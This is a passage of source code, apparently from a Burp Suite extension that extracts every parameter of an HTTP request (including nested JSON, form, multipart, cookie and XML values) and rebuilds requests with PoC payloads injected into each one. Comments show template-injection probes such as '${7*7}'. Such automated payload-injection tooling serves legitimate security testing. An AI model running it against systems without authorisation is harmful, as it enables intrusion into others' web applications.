            multipart_params = self._parse_multipart(body_str)
            for key, val in multipart_params:
                params.append({
                    "path": key,
                    "value": val,
                    "location": "body"
                })
                # 也尝试解析JSON嵌套
                json_nested = self._try_parse_json_value(val)
                if json_nested:
                    for nested_path, nested_val in json_nested:
                        full_path = key + "." + nested_path
                        params.append({
                            "path": full_path,
                            "value": nested_val,
                            "location": "body"
                        })

        elif content_type == "xml":
            # XML body: 提取标签文本内容
            xml_params = self._parse_xml_body(body_str)
            for path, val in xml_params:
                params.append({
                    "path": path,
                    "value": val,
                    "location": "body"
                })

        else:
            # 未知类型: 尝试智能解析（支持URL编码的JSON和form数据）
            parsed = False
            # 第1步: 尝试JSON解析 (字符串扫描，支持重复key)
            for attempt in [body_str, self._safe_url_decode(body_str)]:
                if not attempt or parsed:
                    continue
                try:
                    leaves = self._scan_json_leaves(attempt)
                    if leaves:
                        for leaf in leaves:
                            params.append({
                                "path": leaf["path"],
                                "value": leaf["value"],
                                "location": "body"
                            })
                        parsed = True
                except:
                    pass

            # 第2步: JSON解析失败，尝试form解析
            if not parsed:
                # 先尝试URL解码整个body再解析form
                decoded_body = self._safe_url_decode(body_str)
                body_to_parse = decoded_body if decoded_body else body_str
                if "=" in body_to_parse:
                    form_params = self._parse_query_string(body_to_parse)
                    for key, val in form_params:
                        params.append({
                            "path": key,
                            "value": val,
                            "location": "body"
                        })
                        # 深层JSON嵌套检测
                        json_nested = self._try_parse_json_value(val)
                        if json_nested:
                            for nested_path, nested_val in json_nested:
                                params.append({
                                    "path": key + "." + nested_path,
                                    "value": nested_val,
                                    "location": "body"
                                })

        return params

    def _extract_json_leaves(self, obj, prefix, result, location):
        """递归提取JSON对象中的所有叶子节点。"""
        if isinstance(obj, dict):
            for key, value in obj.items():
                path = prefix + "." + key if prefix else key
                if isinstance(value, dict):
                    self._extract_json_leaves(value, path, result, location)
                elif isinstance(value, list):
                    for i, item in enumerate(value):
                        arr_path = path + "[" + str(i) + "]"
                        if isinstance(item, (dict, list)):
                            self._extract_json_leaves(item, arr_path, result, location)
                        else:
                            result.append({
                                "path": arr_path,
                                "value": self._safe_str(item),
                                "location": location
                            })
                else:
                    result.append({
                        "path": path,
                        "value": self._safe_str(value),
                        "location": location
                    })
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                path = prefix + "[" + str(i) + "]" if prefix else "[" + str(i) + "]"
                if isinstance(item, (dict, list)):
                    self._extract_json_leaves(item, path, result, location)
                else:
                    result.append({
                        "path": path,
                        "value": self._safe_str(item),
                        "location": location
                    })

    def _try_parse_json_value(self, val):
        """尝试将字符串解析为JSON，提取深层叶子节点。
        使用字符串扫描方式，完美处理重复key的JSON结构。"""
        if not val:
            return None
        v = val.strip()

        # 尝试多种编码解码
        for attempt in [v, self._safe_url_decode(v)]:
            if not attempt:
                continue
            attempt = attempt.strip()
            if not ((attempt.startswith('{') and attempt.endswith('}')) or
                    (attempt.startswith('[') and attempt.endswith(']'))):
                continue
            try:
                leaves = self._scan_json_leaves(attempt)
                if leaves:
                    return [(leaf["path"], leaf["value"]) for leaf in leaves]
            except:
                continue
        return None

    # ---- JSON字符串扫描器 (处理重复key，不丢失任何嵌套数据) ----

    def _scan_json_leaves(self, json_str, outer_prefix=""):
        """字符串级JSON扫描：提取所有叶子节点的(path, value, 位置)。
        完美处理重复key — 每个key出现都会被单独记录。
        返回: [{"path": "key[0].nested", "value": "val", "start": 10, "end": 17}, ...]
        """
        results = []
        i = 0
        n = len(json_str)

        def skip_ws(pos):
            while pos < n and json_str[pos] in ' \t\n\r':
                pos += 1
            return pos

        def parse_string(pos):
            """解析JSON字符串，返回 (content, end_pos)"""
            if pos >= n or json_str[pos] != '"':
                return None, pos
            pos += 1  # skip opening "
            chars = []
            while pos < n:
                ch = json_str[pos]
                if ch == '\\':
                    pos += 1
                    if pos < n:
                        esc = json_str[pos]
                        if esc == '"': chars.append('"')
                        elif esc == '\\': chars.append('\\')
                        elif esc == '/': chars.append('/')
                        elif esc == 'n': chars.append('\n')
                        elif esc == 't': chars.append('\t')
                        elif esc == 'r': chars.append('\r')
                        elif esc == 'u':
                            chars.append(json_str[pos:pos+5])  # 保留unicode转义
                            pos += 4
                        else:
                            chars.append('\\' + esc)
                        pos += 1
                elif ch == '"':
                    pos += 1
                    return ''.join(chars), pos
                else:
                    chars.append(ch)
                    pos += 1
            return None, pos

        def parse_primitive(pos):
            """解析原始值(number/true/false/null)，返回 (value_str, end_pos)"""
            start = pos
            while pos < n and json_str[pos] not in ',}] \t\n\r':
                pos += 1
            token = json_str[start:pos]
            # 判断类型
            if token == 'true' or token == 'false' or token == 'null':
                return token, pos
            # 数字
            try:
                float(token)
                return token, pos
            except:
                return None, start

        # ---- 主递归: 解析一个JSON值 ----
        def parse_value(pos, path_stack, key_counts):
            """解析从pos开始的JSON值。
            path_stack: [(key_name, occurrence_index), ...]
            key_counts: dict tracking dup counts per depth+key
            当遇到叶子值时，记录到results。"""
            pos = skip_ws(pos)
            if pos >= n:
                return pos

            ch = json_str[pos]

            if ch == '{':
                # ---- 解析对象 ----
                pos += 1
                pos = skip_ws(pos)
                if pos < n and json_str[pos] == '}':
                    return pos + 1  # 空对象

                # 统计本层每个key出现的次数 (先扫描一遍key用于计算索引)
                local_key_order = []
                scan_pos = pos
                scan_depth = 1
                while scan_pos < n and scan_depth > 0:
                    sc = json_str[scan_pos]
                    if sc == '{': scan_depth += 1
                    elif sc == '}': scan_depth -= 1
                    elif sc == '"' and scan_depth == 1:
                        key_content, scan_pos = parse_string(scan_pos)
                        scan_pos = skip_ws(scan_pos)
                        if scan_pos < n and json_str[scan_pos] == ':':
                            local_key_order.append(key_content)
                        continue
                    scan_pos += 1

                # 为每个key分配索引
                local_key_index = {}
                key_occurrence_tracker = {}
                for k in local_key_order:
                    if k not in key_occurrence_tracker:
                        key_occurrence_tracker[k] = 0
                    else:
                        key_occurrence_tracker[k] += 1
                    local_key_index[(k, key_occurrence_tracker[k])] = key_occurrence_tracker[k]

                # 正式解析
                key_pos_tracker = {}
                while True:
                    pos = skip_ws(pos)
                    if pos >= n or json_str[pos] == '}':
                        pos += 1
                        break

                    # 解析key
                    key_content, pos = parse_string(pos)
                    if key_content is None:
                        break

                    # 跟踪此key是第几次出现
                    if key_content not in key_pos_tracker:
                        key_pos_tracker[key_content] = 0
                    else:
                        key_pos_tracker[key_content] += 1
                    key_idx = key_pos_tracker[key_content]
                    key_label = key_content if key_occurrence_tracker.get(key_content, 0) == 0 else key_content + '[' + str(key_idx) + ']'

                    pos = skip_ws(pos)
                    if pos < n and json_str[pos] == ':':
                        pos += 1

                    new_stack = path_stack + [(key_label, key_idx)]

                    pos = skip_ws(pos)
                    if pos < n:
                        ch2 = json_str[pos]
                        if ch2 == '{' or ch2 == '[':
                            pos = parse_value(pos, new_stack, key_counts)
                        elif ch2 == '"':
                            val_start = pos
                            val_str, pos = parse_string(pos)
                            if val_str is not None:
                                path = '.'.join(s[0] for s in new_stack)
                                path = outer_prefix + ('.' + path if outer_prefix else path)
                                results.append({"path": path, "value": val_str,
                                                "start": val_start, "end": pos})
                        else:
                            val_start = pos
                            val_str, pos = parse_primitive(pos)
                            if val_str is not None:
                                path = '.'.join(s[0] for s in new_stack)
                                path = outer_prefix + ('.' + path if outer_prefix else path)
                                results.append({"path": path, "value": val_str,
                                                "start": val_start, "end": pos})

                    pos = skip_ws(pos)
                    if pos < n and json_str[pos] == ',':
                        pos += 1
                    elif pos < n and json_str[pos] == '}':
                        pos += 1
                        break

                return pos

            elif ch == '[':
                # ---- 解析数组 ----
                pos += 1
                idx = 0
                while True:
                    pos = skip_ws(pos)
                    if pos >= n or json_str[pos] == ']':
                        pos += 1
                        break
                    new_stack = path_stack + [('[' + str(idx) + ']', idx)]
                    pos = parse_value(pos, new_stack, key_counts)
                    idx += 1
                    pos = skip_ws(pos)
                    if pos < n and json_str[pos] == ',':
                        pos += 1
                    elif pos < n and json_str[pos] == ']':
                        pos += 1
                        break
                return pos

            elif ch == '"':
                # 叶子值: 字符串
                val_start = pos
                val_str, pos = parse_string(pos)
                if val_str is not None:
                    path = '.'.join(s[0] for s in path_stack)
                    path = outer_prefix + ('.' + path if outer_prefix else path)
                    results.append({"path": path, "value": val_str,
                                    "start": val_start, "end": pos})
                return pos

            else:
                # 叶子值: number/true/false/null
                val_start = pos
                val_str, pos = parse_primitive(pos)
                if val_str is not None:
                    path = '.'.join(s[0] for s in path_stack)
                    path = outer_prefix + ('.' + path if outer_prefix else path)
                    results.append({"path": path, "value": val_str,
                                    "start": val_start, "end": pos})
                return pos

        parse_value(0, [], {})
        return results

    def _replace_json_string_value(self, json_str, target_path, new_value):
        """在JSON字符串中按路径替换值。使用扫描定位，支持重复key。
        返回修改后的JSON字符串，或None（路径未找到）。"""
        # 使用扫描器找到目标位置
        leaves = self._scan_json_leaves(json_str)
        for leaf in leaves:
            if leaf["path"] == target_path:
                # JSON encode the new value appropriately
                encoded = json.dumps(new_value, ensure_ascii=False)
                return json_str[:leaf["start"]] + encoded + json_str[leaf["end"]:]
        return None

    def _safe_url_decode(self, s):
        """安全URL解码，失败返回None。"""
        if not s or '%' not in s:
            return None
        try:
            from urllib import unquote
            decoded = unquote(s)
            if decoded != s:
                return decoded
        except:
            pass
        return None

    def _should_url_encode(self):
        """判断是否需要对替换值进行URL编码。"""
        try:
            if hasattr(self, 'chkbox_url_encode'):
                return self.chkbox_url_encode.isSelected()
        except:
            pass
        return False  # 默认不编码，便于观察

    def _should_preserve_value(self):
        """判断是否需要在替换时保留原始参数值再拼接Payload。"""
        try:
            if hasattr(self, 'chkbox_preserve_value'):
                return self.chkbox_preserve_value.isSelected()
        except:
            pass
        return False  # 默认不保留，直接替换

    def _maybe_url_encode(self, value):
        """根据用户配置决定是否URL编码。"""
        if self._should_url_encode():
            try:
                from urllib import quote as url_quote
                return url_quote(value, safe='')
            except:
                return value
        return value  # 不做编码，保留原始payload可读性

    def _parse_query_string(self, qs):
        """解析query string或form-urlencoded body为[(key, value), ...]
        JSON-aware: 不会在JSON结构内部的 & 和 = 上分割。"""
        result = []
        if not qs:
            return result

        # JSON-aware分割: 跟踪大括号/中括号深度，不在JSON内部按&分割
        parts = self._smart_split(qs, "&", depth_aware=True)

        for part in parts:
            if not part:
                continue
            if "=" in part:
                # JSON-aware: 只在JSON外部按=分割
                key, val = self._smart_split_pair(part)
                # URL decode
                try:
                    from urllib import unquote
                    key = unquote(key)
                    val = unquote(val)
                except:
                    pass
                if key:
                    result.append((key, val))
            elif part.strip():
                result.append((part.strip(), ""))
        return result

    def _smart_split(self, text, delimiter, depth_aware=False):
        """智能分割字符串，如果depth_aware=True则在JSON结构内部不分割。"""
        if not depth_aware:
            return text.split(delimiter)
        parts = []
        depth = 0
        in_string = False
        escape_next = False
        current = []
        for ch in text:
            if escape_next:
                current.append(ch)
                escape_next = False
                continue
            if ch == '\\' and in_string:
                current.append(ch)
                escape_next = True
                continue
            if ch == '"' and not escape_next:
                in_string = not in_string
                current.append(ch)
                continue
            if not in_string:
                if ch in ('{', '['):
                    depth += 1
                elif ch in ('}', ']'):
                    depth -= 1
                elif ch == delimiter and depth == 0:
                    parts.append(''.join(current))
                    current = []
                    continue
            current.append(ch)
        if current:
            parts.append(''.join(current))
        return parts

    def _smart_split_pair(self, text):
        """JSON-aware的key=value分割，只在depth=0的=处分割。"""
        depth = 0
        in_string = False
        escape_next = False
        for i, ch in enumerate(text):
            if escape_next:
                escape_next = False
                continue
            if ch == '\\' and in_string:
                escape_next = True
                continue
            if ch == '"' and not escape_next:
                in_string = not in_string
                continue
            if not in_string:
                if ch in ('{', '['):
                    depth += 1
                elif ch in ('}', ']'):
                    depth -= 1
                elif ch == '=' and depth == 0:
                    return text[:i], text[i+1:]
        # 没有找到外部的=，返回整个文本和空字符串
        return text, ""

    def _parse_cookie_string(self, cookie_str):
        """解析Cookie字符串为[(key, value), ...]"""
        result = []
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                key, val = part.split("=", 1)
                if key:
                    result.append((key, val))
        return result

    def _parse_multipart(self, body_str):
        """解析multipart/form-data body，提取字段名和值。"""
        result = []
        # 查找boundary
        if not body_str.startswith("--"):
            return result

        lines = body_str.split("\r\n")
        boundary = lines[0].strip()
        i = 1
        while i < len(lines):
            if lines[i].strip() == boundary or lines[i].strip() == boundary + "--":
                break
            if lines[i].strip().startswith("Content-Disposition"):
                # 提取 name="..."
                m = re.search(r'name="([^"]+)"', lines[i])
                if m:
                    name = m.group(1)
                    # 跳过headers
                    i += 1
                    while i < len(lines) and lines[i].strip() != "":
                        i += 1
                    i += 1  # 跳过空行
                    # 读取值直到下一个boundary
                    value_parts = []
                    while i < len(lines):
                        line = lines[i]
                        if line.strip().startswith("--"):
                            break
                        value_parts.append(line)
                        i += 1
                    value = "\r\n".join(value_parts)
                    if name:
                        result.append((name, value))
                    continue
            i += 1

        return result

    def _parse_xml_body(self, body_str):
        """简易XML解析：提取<tag>value</tag>中的标签和文本内容。"""
        result = []
        # 匹配所有叶子节点：<tag>text</tag> 或 <tag attr="v">text</tag>
        pattern = r'<(\w+)[^>]*>([^<]+)</\1>'
        matches = re.findall(pattern, body_str)
        for tag, text in matches:
            if text.strip():
                result.append((tag, text.strip()))
        return result

    def _get_content_type_category(self, headers):
        """从headers中获取Content-Type分类。"""
        for h in headers:
            hl = h.lower()
            if hl.startswith("content-type:"):
                ct = hl.split(":", 1)[1].strip().lower()
                if "application/json" in ct:
                    return "json"
                elif "application/x-www-form-urlencoded" in ct:
                    return "form"
                elif "multipart/form-data" in ct:
                    return "multipart"
                elif "text/xml" in ct or "application/xml" in ct:
                    return "xml"
        return "unknown"

    def _safe_str(self, val):
        """安全转换为字符串。"""
        if val is None:
            return "null"
        if isinstance(val, bool):
            return "true" if val else "false"
        try:
            return str(val)
        except:
            return ""

    # ======================== PoC值提取 ========================

    def _extract_poc_values(self, poc_full):
        """从PoC字符串中提取所有可能的payload值。使用字符串扫描处理JSON PoC。"""
        values = []

        # 尝试form-urlencoded解析: fragment=__${7*7}__ → __${7*7}__
        if "=" in poc_full:
            try:
                form_params = self._parse_query_string(poc_full)
                for key, val in form_params:
                    if val and val not in values:
                        values.append(val)
            except:
                pass

        # 尝试JSON解析: {"key":"${7*7}"} → ${7*7}
        try:
            leaves = self._scan_json_leaves(poc_full)
            for leaf in leaves:
                v = leaf["value"]
                if v and v not in values:
                    values.append(v)
        except:
            pass

        # 如果什么都没提取到，使用完整字符串
        if not values:
            values.append(poc_full)

        return values

        return values

    def _parse_poc_as_form(self, poc_full):
        """解析PoC的key=value&...结构为dict。用于追加模式。JSON-aware分割。"""
        params = {}
        if "=" in poc_full:
            try:
                parts = self._smart_split(poc_full, "&", depth_aware=True)
                for part in parts:
                    if "=" in part:
                        k, v = self._smart_split_pair(part)
                        if k:
                            params[k] = v
            except:
                pass
        return params

    # ======================== 请求重构 ========================

    def _build_param_replaced_request(self, baseRequestResponse, analyResult, headers,
                                       raw_body_str, content_type, param_info, new_value):
        """
        构建参数值替换后的请求。
        param_info: {"path", "value", "location"}
        new_value: 新的参数值 (如PoC payload)
        """
        location = param_info["location"]
        param_path = param_info["path"]

        # ---- 保留原始值再拼接: username=admin+Payload ----
        if self._should_preserve_value():
            original_value = param_info.get("value", "")
            new_value = original_value + new_value

        if location == "query":
            return self._build_query_replaced_request(
                baseRequestResponse, analyResult, headers, raw_body_str,
                param_path, new_value
            )
        elif location == "cookie":
            return self._build_header_replaced_request(
                baseRequestResponse, analyResult, headers,
                "Cookie", param_path.replace("Cookie:", "", 1), new_value
            )
        elif location == "header":
            return self._build_header_replaced_request(
                baseRequestResponse, analyResult, headers,
                param_path, None, new_value
            )
        else:
            # body参数
            return self._build_body_replaced_request(
                baseRequestResponse, analyResult, headers,
                raw_body_str, content_type, param_path, new_value
            )

    def _build_query_replaced_request(self, baseRequestResponse, analyResult, headers,
                                       raw_body_str, param_name, new_value):
        """替换query string参数的请求。URL编码可选。"""
        url_obj = analyResult.getUrl()
        query = url_obj.getQuery() if url_obj.getQuery() else ""

        # 重建query string
        new_query_parts = []
        for part in query.split("&"):
            if "=" in part:
                k, v = part.split("=", 1)
                if k == param_name:
                    new_query_parts.append(k + "=" + self._maybe_url_encode(new_value))
                else:
                    new_query_parts.append(part)
            else:
                new_query_parts.append(part)

        new_query = "&".join(new_query_parts)

        # 重建完整URL路径
        path = url_obj.getPath() if url_obj.getPath() else "/"
        if path.endswith("/") and not path.startswith("/"):
            path = "/" + path
        new_path = path if not new_query else path + "?" + new_query

        return self._build_request_with_new_path(
            baseRequestResponse, headers, new_path, raw_body_str
        )

    def _build_body_replaced_request(self, baseRequestResponse, analyResult, headers,
                                      raw_body_str, content_type, param_path, new_value):
        """替换body中参数值的请求。支持嵌套路径。"""
        new_body_str = self._replace_body_value(raw_body_str, content_type, param_path, new_value)
        if new_body_str is None:
            return None

        return self._build_request_with_new_body(
            baseRequestResponse, headers, new_body_str
        )

    def _replace_body_value(self, body_str, content_type, param_path, new_value):
        """
        在body中替换指定路径的参数值。使用字符串扫描确保重复key不丢失数据。
        param_path: 如 "user.name" 或 "items[0].id" 或简单 "username"
        """
        # 判断是否为嵌套路径
        if "." in param_path or "[" in param_path:
            if content_type == "json":
                return self._replace_json_string_value(body_str, param_path, new_value)
            elif content_type == "form":
                return self._replace_nested_form_value(body_str, param_path, new_value)
            else:
                # 尝试 JSON 字符串替换（支持重复key）
                result = self._replace_json_string_value(body_str, param_path, new_value)
                if result is not None:
                    return result
                return self._replace_nested_form_value(body_str, param_path, new_value)
        else:
            # 简单参数名，直接替换
            if content_type == "json":
                return self._replace_json_string_value(body_str, param_path, new_value)
            elif content_type == "form":
                return self._replace_form_value(body_str, param_path, new_value)
            elif content_type == "multipart":
                return self._replace_multipart_value(body_str, param_path, new_value)
            else:
                # 尝试所有方式
                result = self._replace_json_string_value(body_str, param_path, new_value)
                if result is not None:
                    return result
                result = self._replace_form_value(body_str, param_path, new_value)
                if result is not None:
                    return result
                return self._replace_multipart_value(body_str, param_path, new_value)

    def _replace_json_at_path(self, json_str, param_path, new_value):
        """
        在JSON字符串中替换指定路径的值。
        支持: "user.name", "items[0].name", "config[0].settings.key"
        """
        try:
            obj = json.loads(json_str)
            self._set_json_value(obj, param_path, new_value)
            return json.dumps(obj, ensure_ascii=False)
        except:
            return None

    def _set_json_value(self, obj, path, new_value):
        """在JSON对象中按路径设置值。"""
        # 解析路径: "user.contact.email" 或 "items[0].name"
        parts = self._parse_param_path(path)
        current = obj
        for i, part in enumerate(parts):
            key, is_array, arr_idx = part
            if i == len(parts) - 1:
                # 最后一个：设置值
                if is_array:
                    # 尝试转换为合适的类型
                    current[arr_idx] = self._coerce_value(new_value, current[arr_idx])
                else:
                    if key in current:
                        current[key] = self._coerce_value(new_value, current[key])
            else:
                # 中间节点：进入下一层
                if is_array:
                    current = current[arr_idx]
                else:
                    if key not in current:
                        return
                    current = current[key]

    def _parse_param_path(self, path):
        """
        解析参数路径为parts列表。
        "user.contact.email" → [("user", False, 0), ("contact", False, 0), ("email", False, 0)]
        "items[0].name" → [("items", True, 0), ("name", False, 0)]
        """
        parts = []
        # 按.分割，但要处理[数字]
        tokens = re.findall(r'(\w+)(?:\[(\d+)\])?', path)
        for key, idx in tokens:
            if idx:
                parts.append((key, True, int(idx)))
            else:
                parts.append((key, False, 0))
        return parts

    def _coerce_value(self, new_value, original):
        """尝试将新值转换为与原始值相同的类型。"""
        if isinstance(original, bool):
            return new_value.lower() in ("true", "1", "yes")
        elif isinstance(original, int):
            try:
                return int(new_value)
            except:
                return new_value
        elif isinstance(original, float):
            try:
                return float(new_value)
            except:
                return new_value
        return new_value

    def _replace_nested_form_value(self, body_str, param_path, new_value):
        """
        替换form body中嵌套参数的值。支持URL编码可选。
        例: body_str="data={\"user\":\"admin\"}", param_path="data.user", new_value="PAYLOAD"
        → "data={\"user\":\"PAYLOAD\"}"
        """
        # 解析path的第一级key
        dot_idx = param_path.find(".")
        bracket_idx = param_path.find("[")
        if dot_idx > 0:
            first_key = param_path[:dot_idx]
            rest_path = param_path[dot_idx + 1:]
        elif bracket_idx > 0:
            first_key = param_path[:bracket_idx]
            rest_path = param_path[bracket_idx:]
        else:
            first_key = param_path
            rest_path = None

        form_params = self._parse_query_string(body_str)
        new_parts = []
        replaced = False
        for key, val in form_params:
            if key == first_key:
                if rest_path:
                    # 使用字符串扫描替换JSON内部值（完美处理重复key）
                    new_val = self._replace_json_string_value(val, rest_path, new_value)
                    if new_val is not None:
                        new_parts.append(key + "=" + self._maybe_url_encode(new_val))
                        replaced = True
                    else:
                        # 扫描替换失败，回退：直接替换整个值
                        new_parts.append(key + "=" + self._maybe_url_encode(new_value))
                        replaced = True
                else:
                    new_parts.append(key + "=" + self._maybe_url_encode(new_value))
                    replaced = True
            else:
                # 保持其他参数的原始编码格式
                new_parts.append(key + "=" + self._preserve_encode(val))

        if not replaced:
            # key不存在，添加
            new_parts.append(param_path + "=" + self._maybe_url_encode(new_value))

        return "&".join(new_parts)

    def _preserve_encode(self, value):
        """保持value的原始编码（如果原本是URL编码的就保持，否则按用户设置）。"""
        # 如果用户开启了URL编码，全部编码
        if self._should_url_encode():
            try:
                from urllib import quote as url_quote
                return url_quote(value, safe='')
            except:
                return value
        # 否则保持原样：检查值是否已经被URL编码过
        # 如果包含%XX模式，保持原样；否则返回原始值
        return value

    def _replace_form_value(self, body_str, param_name, new_value):
        """替换form-urlencoded body中简单参数的值。URL编码可选。"""
        form_params = self._parse_query_string(body_str)
        new_parts = []
        replaced = False
        for key, val in form_params:
            if key == param_name:
                new_parts.append(key + "=" + self._maybe_url_encode(new_value))
                replaced = True
            else:
                new_parts.append(key + "=" + self._preserve_encode(val))

        if not replaced:
            new_parts.append(param_name + "=" + self._maybe_url_encode(new_value))

        return "&".join(new_parts)

    def _replace_multipart_value(self, body_str, field_name, new_value):
        """替换multipart body中字段的值。"""
        if not body_str.startswith("--"):
            return None

        lines = body_str.split("\r\n")
        boundary = lines[0].strip()
        new_lines = [boundary]
        i = 1
        replaced = False
        while i < len(lines):
            line = lines[i]
            if line.strip() == boundary + "--":
                new_lines.append(line)
                break
            if line.strip() == boundary:
                new_lines.append(line)
                i += 1
                continue
            if line.strip().startswith("Content-Disposition"):
                m = re.search(r'name="([^"]+)"', line)
                is_file = "filename=" in line
                new_lines.append(line)
                i += 1
                # 复制headers
                while i < len(lines) and lines[i].strip() != "":
                    new_lines.append(lines[i])
                    i += 1
                new_lines.append("")  # 空行
                i += 1
                # 值
                if m and m.group(1) == field_name and not is_file:
                    new_lines.append(new_value)
                    replaced = True
                else:
                    # 跳过原值
                    while i < len(lines) and not lines[i].strip().startswith("--"):
                        new_lines.append(lines[i])
                        i += 1
                    continue
                # 跳到下一个boundary
                while i < len(lines) and not lines[i].strip().startswith("--"):
                    i += 1
                continue
            i += 1

        if not replaced:
            # 追加新字段
            new_lines.insert(-1, 'Content-Disposition: form-data; name="' + field_name + '"')
            new_lines.insert(-1, "")
            new_lines.insert(-1, new_value)
            new_lines.insert(-1, boundary)

        return "\r\n".join(new_lines)

    def _build_header_replaced_request(self, baseRequestResponse, analyResult, headers,
                                        header_name, param_name, new_value):
        """替换指定Header中的值。支持Cookie中的子参数。"""
        new_headers = []
        request_line = None
        for h in headers:
            # 保留请求行
            if h.startswith("GET ") or h.startswith("POST ") or h.startswith("PUT ") or \
               h.startswith("DELETE ") or h.startswith("PATCH ") or h.startswith("HEAD ") or \
               h.startswith("OPTIONS "):
                request_line = h
                new_headers.append(h)
                continue

            hl = h.lower()
            if param_name and hl.startswith(header_name.lower() + ":"):
                # 替换Cookie中的子参数
                if header_name.lower() == "cookie":
                    new_cookie = self._replace_cookie_param(
                        h.split(":", 1)[1].strip(), param_name, new_value
                    )
                    new_headers.append("Cookie: " + new_cookie)
                else:
                    new_headers.append(h)  # 保持原header
            elif hl.startswith(header_name.lower() + ":"):
                # 直接替换整个header值
                new_headers.append(header_name + ": " + new_value)
            elif hl.startswith("content-length:"):
                continue  # 让Burp自动计算
            else:
                new_headers.append(h)

        return self._build_request_with_headers(
            baseRequestResponse, new_headers, request_line
        )

    def _replace_cookie_param(self, cookie_str, param_name, new_value):
        """替换Cookie字符串中的单个参数。"""
        parts = cookie_str.split(";")
        new_parts = []
        replaced = False
        for p in parts:
            p = p.strip()
            if "=" in p:
                k, v = p.split("=", 1)
                if k.strip() == param_name:
                    new_parts.append(k.strip() + "=" + new_value)
                    replaced = True
                else:
                    new_parts.append(p)
            else:
                new_parts.append(p)
        if not replaced:
            new_parts.append(param_name + "=" + new_value)
        return "; ".join(new_parts)

    def _build_append_request(self, baseRequestResponse, analyResult, headers,
                               raw_body_str, content_type, poc_form_params):
        """构建追加POC参数的请求（保留原参数，追加POC的key=value）。"""
        if content_type in ("form", "unknown", "multipart"):
            # form-urlencoded: 追加参数
            original_params = self._parse_query_string(raw_body_str) if raw_body_str else []
            new_parts = []
            for k, v in original_params:
                new_parts.append(k + "=" + self._preserve_encode(v))
            for poc_key, poc_val in poc_form_params.items():
                # 避免覆盖同名参数
                existing_keys = [pk for pk, pv in original_params]
                if poc_key not in existing_keys:
                    new_parts.append(poc_key + "=" + self._maybe_url_encode(poc_val))
            new_body = "&".join(new_parts)

            return self._build_request_with_new_body(
                baseRequestResponse, headers, new_body
            )

        elif content_type == "json":
            # JSON: 追加key到JSON对象
            try:
                obj = json.loads(raw_body_str) if raw_body_str.strip() else {}
                if isinstance(obj, dict):
                    for poc_key, poc_val in poc_form_params.items():
                        if poc_key not in obj:
                            obj[poc_key] = poc_val
                    new_body = json.dumps(obj, ensure_ascii=False)
                    return self._build_request_with_new_body(
                        baseRequestResponse, headers, new_body
                    )
            except:
                pass

        return None

    # ---- 底层请求构建方法 ----

    def _build_request_with_new_path(self, baseRequestResponse, headers, new_path, body_str):
        """用新路径构建请求。"""
        new_headers = []
        for h in headers:
            if h.startswith("GET ") or h.startswith("POST ") or h.startswith("PUT ") or \
               h.startswith("DELETE ") or h.startswith("PATCH ") or h.startswith("HEAD ") or \
               h.startswith("OPTIONS "):
                # 替换请求行，保持原method
                parts = h.split(" ", 2)
                method = parts[0]
                new_headers.append(method + " " + new_path + " " + parts[2] if len(parts) > 2 else " HTTP/1.1")
            elif h.lower().startswith("content-length:"):
                continue
            else:
                new_headers.append(h)

        return helpers.buildHttpMessage(new_headers, body_str)

    def _build_request_with_new_body(self, baseRequestResponse, headers, new_body_str):
        """用新body构建请求。"""
        new_headers = []
        for h in headers:
            hl = h.lower()
            if hl.startswith("content-length:") or hl.startswith("transfer-encoding:"):
                continue
            new_headers.append(h)

        return helpers.buildHttpMessage(new_headers, new_body_str)

    def _build_request_with_headers(self, baseRequestResponse, new_headers, request_line):
        """用新headers构建请求。从原始请求中提取body。"""
        analyResult = helpers.analyzeRequest(baseRequestResponse)
        body_offset = analyResult.getBodyOffset()
        body_str = helpers.bytesToString(baseRequestResponse.getRequest()[body_offset:])

        return helpers.buildHttpMessage(new_headers, body_str)

    # ======================== MD5 & 工具方法 ========================

    def getMd5(self, key):
        m = hashlib.md5()
        try:
            if isinstance(key, unicode):
                m.update(key.encode('utf-8'))
            else:
                m.update(str(key))
        except Exception:
            try:
                m.update(str(key))
            except:
                pass
        return m.hexdigest()

    def clearLog(self, actionEvent=None):
        global log, log2, log3, log4_md5, sent_requests
        log = []
        log2 = {}
        log3 = []
        log4_md5 = []
        sent_requests = set()
        self.count = 0
        try:
            firstModel.fireTableRowsInserted(0, 0)
        except:
            pass
        try:
            secondModel.fireTableRowsInserted(0, 0)
        except:
            pass
        print("[+] 列表已清空")

    # ======================== IMessageEditorController ========================

    def getRequest(self):
        return currentlyDisplayedItem.getRequest()

    def getResponse(self):
        return currentlyDisplayedItem.getResponse()

    def getHttpService(self):
        return currentlyDisplayedItem.getHttpService()

    # ======================== 内部类：表格模型 ========================

    class SecondModel(AbstractTableModel):
        """详细结果表格模型（每个POC的测试结果）"""
        def getRowCount(self):
            global log3
            return len(log3)

        def getColumnCount(self):
            return 6

        def getColumnName(self, columnIndex):
            if columnIndex == 0:
                return unicode("POC", "utf-8")
            elif columnIndex == 1:
                return unicode("匹配特征", "utf-8")
            elif columnIndex == 2:
                return unicode("检测结果", "utf-8")
            elif columnIndex == 3:
                return unicode("响应长度", "utf-8")
            elif columnIndex == 4:
                return unicode("用时(ms)", "utf-8")
            elif columnIndex == 5:
                return unicode("响应码", "utf-8")
            else:
                return ""

        def getColumnClass(self, columnIndex):
            return str

        def getValueAt(self, rowIndex, columnIndex):
            global log3, helpers
            logEntry = log3[rowIndex]
            if columnIndex == 0:
                return logEntry.parameter
            elif columnIndex == 1:
                return logEntry.value
            elif columnIndex == 2:
                return logEntry.change
            elif columnIndex == 3:
                return logEntry.contentlen
            elif columnIndex == 4:
                return logEntry.times
            elif columnIndex == 5:
                return logEntry.response_code
            else:
                return ""

    class FirstModel(AbstractTableModel):
        """主表格模型（每个被扫描的URL一条）"""
        def getRowCount(self):
            global log
            return len(log)

        def getColumnCount(self):
            return 5

        def getColumnName(self, columnIndex):
            if columnIndex == 0:
                return unicode("#", "utf-8")
            elif columnIndex == 1:
                return unicode("Time", "utf-8")
            elif columnIndex == 2:
                return unicode("URL", "utf-8")
            elif columnIndex == 3:
                return unicode("Method", "utf-8")
            elif columnIndex == 4:
                return unicode("状态", "utf-8")
            else:
                return ""

        def getColumnClass(self, columnIndex):
            return str

        def getValueAt(self, rowIndex, columnIndex):
            global helpers
            logEntry = log[rowIndex]
            if columnIndex == 0:
                return logEntry.id
            elif columnIndex == 1:
                return time.strftime("%H:%M:%S", time.localtime(logEntry.time))
            elif columnIndex == 2:
                return logEntry.url.toString()
